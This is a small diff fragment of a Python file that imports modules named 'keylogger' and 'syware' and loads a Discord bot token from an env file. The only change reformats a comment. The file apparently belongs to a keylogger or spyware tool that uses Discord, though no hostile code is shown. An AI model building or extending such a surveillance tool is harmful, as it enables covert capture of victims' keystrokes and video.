@@ -7,7 +7,7 @@ import dotenv
 import keylogger as key 
 import syware as video
 
-#discord
+# Discord #
 env = dotenv.find_dotenv('Tokkens.env')
 dotenv.load_dotenv(env)
 TOKEN = os.getenv('DISCORD_TOKEN')
